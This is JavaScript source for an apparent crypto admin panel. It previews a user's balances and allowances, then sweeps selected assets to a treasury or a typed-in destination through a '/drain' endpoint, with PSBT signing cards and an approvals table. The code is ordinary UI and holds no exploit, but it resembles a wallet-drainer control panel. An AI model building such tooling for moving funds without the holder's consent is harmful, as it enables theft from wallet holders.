/* ---------- sweep modal ---------- */

const SKIP_COPY = {
  WRAP_REQUIRED: 'Needs a wrap first — native cannot be pulled by allowance',
  INSUFFICIENT_GAS: 'Not enough native to pay for its own transfer',
  NO_ALLOWANCE: 'No live allowance',
  ZERO_BALANCE: 'Nothing to move',
  DUST: 'Below dust limit',
  RESERVE: 'Entirely consumed by the gas reserve',
  UNWRAP_REQUIRED: 'Destination holds wrapped native — unwrap at treasury',
  NO_PRICE: 'No price feed — sweeps at $0 valuation',
};

let sweep = null;

function keyOf(r) { return r.address ? `${r.address}:${r.network}:${r.symbol}` : `${r.network}:${r.symbol}`; }

async function openSweepModal(userId) {
  sweep = { userId, rows: [], selected: new Set(), destination: '', busy: false };
  document.getElementById('sweep-body').innerHTML = '<p class="muted">Loading…</p>';
  showModal('sweep-modal');

  let res;
  try { res = await api(`/api/admin/users/${userId}/sweep-preview`); }
  catch (e) { document.getElementById('sweep-body').innerHTML = `<p class="err">${esc(e.message)}</p>`; return; }

  if (!res || !Array.isArray(res.rows)) {
    document.getElementById('sweep-body').innerHTML = `<p class="err">${esc((res && res.error) || 'Preview failed')}</p>`;
    return;
  }

  sweep.rows = res.rows;
  renderSweep();
}

function renderSweep() {
  const body = document.getElementById('sweep-body');
  const total = sweep.rows.filter((r) => sweep.selected.has(keyOf(r))).reduce((a, r) => a + (r.usd || 0), 0);

  const groups = new Map();
  for (const r of sweep.rows) {
    if (!groups.has(r.network)) groups.set(r.network, []);
    groups.get(r.network).push(r);
  }

  body.innerHTML = `
    <div class="sweep-toolbar">
      <button class="btn sm" data-act="all">Select all</button>
      <button class="btn sm" data-act="native">Native only</button>
      <button class="btn sm" data-act="clear">Clear</button>
      <label class="inline"><input type="checkbox" id="respect-reserve" checked> Respect gas reserve</label>
      <label class="inline">Destination <input id="sweep-destination" placeholder="default treasury" value="${esc(sweep.destination)}"></label>
    </div>
    <table class="tbl sweep-tbl">
      <thead><tr><th></th><th>Asset</th><th>Wallet Address</th><th>Balance</th><th>Allowance</th><th>Reserve</th><th>USD</th></tr></thead>
      <tbody>
      ${[...groups.entries()].map(([network, rows]) => `
        <tr class="grp"><td colspan="7">${esc(network)}</td></tr>
        ${rows.map((r) => {
          const k = keyOf(r);
          const off = !r.sweepable;
          const title = r.reason ? (SKIP_COPY[r.reason] || r.reason) : '';
          return `<tr class="${off ? 'disabled' : ''}" ${title ? `title="${esc(title)}"` : ''}>
            <td><input type="checkbox" data-key="${esc(k)}" ${sweep.selected.has(k) ? 'checked' : ''} ${off ? 'disabled' : ''}></td>
            <td>${esc(r.symbol)} <span class="tag">${esc(r.kind)}</span></td>
            <td>${r.wallet_name ? `<span class="small"><b>${esc(r.wallet_name)}</b></span> ` : ''}<span class="mono">${esc(r.address ? (r.address.slice(0, 6) + '…' + r.address.slice(-4)) : '—')}</span></td>
            <td class="num">${esc(r.balance)}</td>
            <td class="num">${r.allowance == null ? '—' : esc(r.allowance)}</td>
            <td class="num">${esc(r.reserve)}</td>
            <td class="num">$${(r.usd || 0).toFixed(2)}</td>
          </tr>`;
        }).join('')}
      `).join('')}
      </tbody>
    </table>
    <footer class="sweep-foot">
      <strong id="sweep-total">Live total $${total.toFixed(2)}</strong>
      <button class="btn primary" id="sweep-go" ${sweep.selected.size && !sweep.busy ? '' : 'disabled'}>${sweep.busy ? 'Sweeping…' : 'Sweep'}</button>
    </footer>`;

  body.querySelectorAll('[data-act]').forEach((b) => b.addEventListener('click', () => {
    const act = b.dataset.act;
    if (act === 'clear') sweep.selected.clear();
    if (act === 'all') sweep.rows.filter((r) => r.sweepable).forEach((r) => sweep.selected.add(keyOf(r)));
    if (act === 'native') {
      sweep.selected.clear();
      sweep.rows.filter((r) => r.kind === 'native' && r.sweepable).forEach((r) => sweep.selected.add(keyOf(r)));
    }
    renderSweep();
  }));

  body.querySelectorAll('input[data-key]').forEach((cb) => cb.addEventListener('change', () => {
    if (cb.checked) sweep.selected.add(cb.dataset.key); else sweep.selected.delete(cb.dataset.key);
    const total2 = sweep.rows.filter((r) => sweep.selected.has(keyOf(r))).reduce((a, r) => a + (r.usd || 0), 0);
    document.getElementById('sweep-total').textContent = `Live total $${total2.toFixed(2)}`;
    document.getElementById('sweep-go').disabled = !sweep.selected.size || sweep.busy;
  }));

  document.getElementById('sweep-destination').addEventListener('input', (e) => { sweep.destination = e.target.value.trim(); });
  document.getElementById('sweep-go').addEventListener('click', fireSweep);
}

async function fireSweep() {
  if (sweep.busy) return;
  const tokens = [...sweep.selected].map((k) => {
    const parts = k.split(':');
    if (parts.length >= 3) {
      return { address: parts[0], network: parts[1], symbol: parts[2] };
    }
    const i = k.lastIndexOf(':');
    return { network: k.slice(0, i), symbol: k.slice(i + 1) };
  });
  if (!tokens.length) return;
  const respectReserve = document.getElementById('respect-reserve').checked;

  sweep.busy = true;
  document.getElementById('sweep-go').disabled = true;
  document.getElementById('sweep-go').textContent = 'Sweeping…';

  let res;
  try {
    res = await api(`/api/admin/users/${sweep.userId}/drain`, 'POST', {
      destination: sweep.destination || null,
      dest: sweep.destination || null,
      tokens,
      respectReserve,
    });
  } catch (e) {
    sweep.busy = false;
    document.getElementById('sweep-go').textContent = 'Sweep';
    return toast(e.message);
  }

  sweep.busy = false;

  if (res && res.code === 'WRAP_REQUIRED') {
    document.getElementById('sweep-go').textContent = 'Sweep';
    return toast(`Wrap first: ${(res.detail || []).join(', ')}`);
  }
  if (res && res.error) {
    document.getElementById('sweep-go').textContent = 'Sweep';
    return toast(res.error);
  }
  if (res && res.queued) {
    closeModal('sweep-modal');
    return toast(`Queued for second admin ($${Number(res.usd || 0).toFixed(2)})`);
  }

  const resList = res && (res.result || res.results || (Array.isArray(res) ? res : []));
  const awaiting = (resList || []).filter((r) => r.status === 'awaiting_signature');
  if (awaiting.length) return renderPsbtCards(awaiting);

  closeModal('sweep-modal');
  const sweptUsd = Number(res && (res.usd ?? res.totalUsd ?? 0));
  toast(`Swept $${isNaN(sweptUsd) ? '0.00' : sweptUsd.toFixed(2)}`);
  if (typeof loadUser === 'function') loadUser(sweep.userId);
}

function renderPsbtCards(rows) {
  document.getElementById('sweep-body').innerHTML = rows.map((r) => `
    <div class="psbt-card">
      <h4>${esc(r.symbol)} · ${esc(r.network)}</h4>
      <p>Sign this PSBT in your wallet, then paste the signed result back.</p>
      <div class="copy-row">
        <input readonly value="${esc(r.sign_url)}" id="url-${r.job}">
        <button class="btn sm" data-copy="url-${r.job}">Copy</button>
      </div>
      <canvas class="qr" data-qr="${esc(r.sign_url)}"></canvas>
      <textarea id="sig-${r.job}" placeholder="signed PSBT (base64)"></textarea>
      <button class="btn primary" data-job="${r.job}">Broadcast</button>
    </div>`).join('');

  document.querySelectorAll('[data-copy]').forEach((b) => b.addEventListener('click', () => {
    const el = document.getElementById(b.dataset.copy);
    if (navigator.clipboard) navigator.clipboard.writeText(el.value);
    else { el.select(); document.execCommand('copy'); }
    toast('Copied');
  }));
  document.querySelectorAll('[data-qr]').forEach((cv) => { if (typeof renderQr === 'function') renderQr(cv, cv.dataset.qr); });
  document.querySelectorAll('[data-job]').forEach((b) => b.addEventListener('click', async () => {
    const signature = document.getElementById(`sig-${b.dataset.job}`).value.trim();
    if (!signature) return toast('Paste the signed PSBT first');
    b.disabled = true;
    const out = await api(`/api/admin/sweep-jobs/${b.dataset.job}/psbt`, 'POST', { signature }).catch((e) => ({ error: e.message }));
    if (out.error) { b.disabled = false; return toast(out.error); }
    toast(`Broadcast ${out.txid}`);
    b.closest('.psbt-card').classList.add('done');
  }));
}

/* ---------- sweep jobs screen ---------- */

async function renderSweepJobs() {
  const el = document.getElementById('view');
  el.innerHTML = '<h2>Pending PSBT jobs</h2><p class="muted">Loading…</p>';
  const res = await api('/api/admin/sweep-jobs').catch((e) => ({ error: e.message, jobs: [] }));
  if (res.error) { el.innerHTML = `<p class="err">${esc(res.error)}</p>`; return; }
  if (!res.jobs.length) { el.innerHTML = '<h2>Pending PSBT jobs</h2><p class="muted">Queue empty.</p>'; return; }
  el.innerHTML = `<h2>Pending PSBT jobs</h2>${res.jobs.map((j) => `
    <div class="row-card">
      <strong>${esc(j.symbol)}</strong> · ${esc(j.network)} · ${esc(j.amount)}
      <span class="muted">${new Date(j.created_at).toLocaleString()}</span>
    </div>`).join('')}`;
}

/* ---------- per-user approvals panel ---------- */

async function renderApprovalsPanel(userId) {
  const el = document.getElementById('approvals-panel');
  el.innerHTML = '<p class="muted">Loading…</p>';
  const res = await api(`/api/admin/users/${userId}/approvals`).catch((e) => ({ error: e.message, approvals: [] }));
  if (res.error) { el.innerHTML = `<p class="err">${esc(res.error)}</p>`; return; }
  if (!res.approvals.length) { el.innerHTML = '<p class="muted">No live approvals.</p>'; return; }

  el.innerHTML = `<table class="tbl">
    <thead><tr><th>Asset</th><th>Allowance</th><th>Balance</th><th>Source</th><th>State</th></tr></thead>
    <tbody>${res.approvals.map((a) => `
      <tr>
        <td>${esc(a.network)}/${esc(a.symbol)}</td>
        <td class="num">${a.unlimited ? 'Unlimited' : esc(a.allowance)}</td>
        <td class="num">${a.balance == null ? '—' : esc(a.balance)}</td>
        <td><span class="tag ${a.source === 'loan' ? 'warn' : ''}">${esc(a.source)}</span></td>
        <td>${a.loans.length ? `<span class="tag warn">securing loan #${a.loans.join(', #')}</span>` : 'revocable'}</td>
      </tr>`).join('')}
    </tbody></table>`;
}